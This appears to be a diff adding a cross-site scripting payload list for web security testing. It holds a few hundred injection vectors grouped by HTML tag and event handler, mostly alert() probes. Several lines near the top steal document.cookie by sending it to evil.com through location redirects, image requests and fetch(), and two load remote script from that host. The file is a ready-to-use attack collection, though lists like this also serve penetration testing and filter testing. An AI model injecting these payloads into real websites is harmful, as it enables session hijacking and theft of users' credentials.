@@ -1,0 +1,236 @@
+# XSS - Basic Payloads
+# Fundamental XSS vectors for initial testing
+# 300+ payloads
+
+# Classic script tags
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>confirm('XSS')</script>
+<script>prompt('XSS')</script>
+<script>console.log('XSS')</script>
+<script src="http://evil.com/xss.js"></script>
+<script src=//evil.com/xss.js></script>
+<script>document.location='http://evil.com/?c='+document.cookie</script>
+<script>new Image().src="http://evil.com/?c="+document.cookie</script>
+<script>fetch('http://evil.com/?c='+document.cookie)</script>
+
+# Image tag onerror
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert(document.cookie)>
+<img src="x" onerror="alert(1)">
+<img src='x' onerror='alert(1)'>
+<img/src=x onerror=alert(1)>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=prompt(1)>
+<img src=1 onerror=alert(1)>
+<img src=# onerror=alert(1)>
+<img src=/ onerror=alert(1)>
+<img src=. onerror=alert(1)>
+<img src="" onerror=alert(1)>
+<img src='' onerror=alert(1)>
+<img src onerror=alert(1)>
+<img onerror=alert(1) src=x>
+<img src=x:x onerror=alert(1)>
+
+# Image tag onload
+<img src=https://via.placeholder.com/1 onload=alert(1)>
+<img src="valid.jpg" onload="alert(1)">
+
+# SVG
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert('XSS')>
+<svg onload=alert(document.domain)>
+<svg onload=alert(document.cookie)>
+<svg><script>alert(1)</script></svg>
+<svg><script>alert('XSS')</script></svg>
+<svg/onload=confirm(1)>
+<svg/onload=prompt(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributename=x to=1>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+
+# Body tag
+<body onload=alert(1)>
+<body onload=alert('XSS')>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1) autofocus>
+<body onscroll=alert(1)><br><br><br>...<br><input autofocus>
+<body onresize=alert(1)>
+<body onhashchange=alert(1)>
+<body ontouchstart=alert(1)>
+<body ontouchend=alert(1)>
+<body ontouchmove=alert(1)>
+
+# Input tag
+<input onfocus=alert(1) autofocus>
+<input onfocus=alert(1) autofocus="">
+<input onblur=alert(1) autofocus><input autofocus>
+<input onfocus=alert(1) autofocus x>
+<input type=text value="" onfocus=alert(1) autofocus>
+<input type="image" src=x onerror=alert(1)>
+<input type="button" value="click" onclick=alert(1)>
+<input onmouseover=alert(1) value="hover me">
+
+# Button tag
+<button onclick=alert(1)>Click</button>
+<button onfocus=alert(1) autofocus>Click</button>
+<button formaction=javascript:alert(1)>Click</button>
+
+# Anchor tag
+<a href=javascript:alert(1)>Click</a>
+<a href="javascript:alert(1)">Click</a>
+<a href='javascript:alert(1)'>Click</a>
+<a href=javascript:alert('XSS')>Click</a>
+<a href=javascript:alert(document.domain)>Click</a>
+<a href=javascript:confirm(1)>Click</a>
+<a href="javascript:void(alert(1))">Click</a>
+<a href="data:text/html,<script>alert(1)</script>">Click</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>
+<a onclick=alert(1)>Click</a>
+<a onmouseover=alert(1)>Hover</a>
+<a onfocus=alert(1) autofocus>Focus</a>
+
+# Iframe
+<iframe src="javascript:alert(1)">
+<iframe src=javascript:alert(1)>
+<iframe src="javascript:alert('XSS')">
+<iframe onload=alert(1)>
+<iframe onload=alert('XSS')>
+<iframe src="data:text/html,<script>alert(1)</script>">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe srcdoc="<img src=x onerror=alert(1)>">
+
+# Div tag
+<div onclick=alert(1)>Click me</div>
+<div onmouseover=alert(1)>Hover me</div>
+<div onmouseenter=alert(1)>Enter me</div>
+<div onmouseleave=alert(1)>Leave me</div>
+<div onmousemove=alert(1)>Move over me</div>
+<div ondblclick=alert(1)>Double click</div>
+<div oncontextmenu=alert(1)>Right click</div>
+<div ondrag=alert(1) draggable="true">Drag me</div>
+
+# Form tag
+<form action="javascript:alert(1)"><button>Submit</button></form>
+<form><button formaction=javascript:alert(1)>Submit</button></form>
+<form onsubmit=alert(1)><button>Submit</button></form>
+<form><input type=submit formaction=javascript:alert(1) value=Submit>
+
+# Select tag
+<select onfocus=alert(1) autofocus></select>
+<select onchange=alert(1)><option>Select</option></select>
+<select autofocus onfocus=alert(1)><option>1</option></select>
+
+# Textarea
+<textarea onfocus=alert(1) autofocus></textarea>
+<textarea autofocus onfocus=alert(1)></textarea>
+<textarea onkeyup=alert(1)></textarea>
+<textarea onkeydown=alert(1)></textarea>
+<textarea onkeypress=alert(1)></textarea>
+
+# Video/Audio
+<video src=x onerror=alert(1)>
+<video><source onerror=alert(1)>
+<video poster=x onerror=alert(1)></video>
+<audio src=x onerror=alert(1)>
+<audio><source onerror=alert(1)>
+<audio autoplay oncanplay=alert(1)><source src="valid.mp3">
+
+# Object/Embed
+<object data="javascript:alert(1)">
+<object data="data:text/html,<script>alert(1)</script>">
+<embed src="javascript:alert(1)">
+<embed src="data:text/html,<script>alert(1)</script>">
+
+# Details/Summary
+<details open ontoggle=alert(1)>
+<details/open/ontoggle=alert(1)>
+<details ontoggle=alert(1) open>Click</details>
+<details open ontoggle=alert(1)><summary>Click</summary></details>
+
+# Marquee (legacy but still works in some browsers)
+<marquee onstart=alert(1)>XSS</marquee>
+<marquee onfinish=alert(1) loop=1>XSS</marquee>
+<marquee behavior=alternate onbounce=alert(1)>XSS</marquee>
+
+# Table elements
+<table background="javascript:alert(1)">
+<table><tr><td background="javascript:alert(1)">
+<table><tbody onfocus=alert(1) autofocus></tbody></table>
+
+# Style tag
+<style>@import'javascript:alert(1)'</style>
+<style onload=alert(1)></style>
+
+# Link tag
+<link rel=import href="data:text/html,<script>alert(1)</script>">
+
+# Keygen (deprecated but may work)
+<keygen onfocus=alert(1) autofocus>
+
+# Meta refresh
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
+
+# Math ML
+<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">CLICKME</maction></math>
+<math href="javascript:alert(1)">CLICKME</math>
+
+# XLink
+<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a></svg>
+<svg><animate xlink:href="#xss" attributeName="href" from="javascript:alert(1)" to="1"/>
+
+# Onanimationend
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationend=alert(1)></div>
+
+# Ontransitionend  
+<style>*{transition:color 1s}</style><div ontransitionend=alert(1) style=color:red></div>
+
+# Focus events
+<div tabindex=0 onfocus=alert(1) autofocus>Focus me</div>
+<span tabindex=0 onfocus=alert(1) autofocus>Focus me</span>
+<p tabindex=0 onfocus=alert(1) autofocus>Focus me</p>
+
+# Drag events
+<div draggable="true" ondragstart=alert(1)>Drag me</div>
+<div ondrop=alert(1)>Drop here</div>
+<div ondragover=alert(1)>Drag over</div>
+
+# Copy/Paste events
+<div oncopy=alert(1)>Copy this</div>
+<div onpaste=alert(1)>Paste here</div>
+<div oncut=alert(1)>Cut this</div>
+
+# Touch events (mobile)
+<div ontouchstart=alert(1)>Touch me</div>
+<div ontouchend=alert(1)>Touch me</div>
+<div ontouchmove=alert(1)>Touch me</div>
+
+# Pointer events
+<div onpointerdown=alert(1)>Click</div>
+<div onpointerup=alert(1)>Click</div>
+<div onpointermove=alert(1)>Hover</div>
+
+# Window events via attributes
+<body onbeforeunload=alert(1)>
+<body onunload=alert(1)>
+<body onmessage=alert(1)>
+<body onstorage=alert(1)>
+<body onoffline=alert(1)>
+<body ononline=alert(1)>
+<body onpopstate=alert(1)>
+
+# Error events
+<script src="invalid" onerror=alert(1)></script>
+<link href="invalid" onerror=alert(1)>
+
+# Print events
+<body onbeforeprint=alert(1)>
+<body onafterprint=alert(1)>
